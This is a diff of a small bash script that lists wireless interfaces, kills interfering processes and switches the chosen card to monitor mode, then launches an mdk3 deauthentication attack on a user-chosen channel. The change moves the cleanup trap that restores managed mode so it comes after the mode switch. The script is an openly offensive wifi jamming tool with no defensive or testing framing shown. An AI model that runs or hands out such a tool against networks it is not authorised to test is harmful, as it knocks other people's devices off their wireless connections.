@@ -1,19 +1,6 @@
 #!/bin/bash
 
-function close {
-	echo "
-"
-	echo -e "\033[31m[-] Exiting and returning card to managed mode!"
-	ifconfig $WIFACE down
-	iwconfig $WIFACE mode managed
-	iwconfig $WIFACE | grep mode
-	ifconfig $WIFACE up
-	service network-manager restart
-	echo ""
-	sleep 1; echo
-}
 
-trap close SIGINT
 
 
 clear
@@ -22,7 +9,7 @@ sleep 0.5;
 	echo ""
 	echo "Network Interfaces:"
 	sleep 0.5;
-	ip -o link show | awk '{print $2,$9}'
+	ip -o link show | awk '/wlan/ {print $2,$9}'
 	echo ""
 	read -e WIFACE
 	sleep 0.5; echo ""
@@ -50,6 +37,21 @@ airmon-ng check kill
 ifconfig $WIFACE down
 iwconfig $WIFACE mode monitor
 ifconfig $WIFACE up
+
+function close {
+	echo "
+"
+	echo -e "\033[31m[-] Exiting and returning card to managed mode!"
+	ifconfig $WIFACE down
+	iwconfig $WIFACE mode managed
+	iwconfig $WIFACE | grep mode
+	ifconfig $WIFACE up
+	service network-manager restart
+	echo ""
+	sleep 1; echo
+}
+
+trap close SIGINT
 	
 	sleep 1;
 	echo ""
@@ -57,5 +59,4 @@ ifconfig $WIFACE up
 	echo -e "\033[92m[-] Starting..."
 
 mdk3 $WIFACE d -c $CHANNEL
-
 
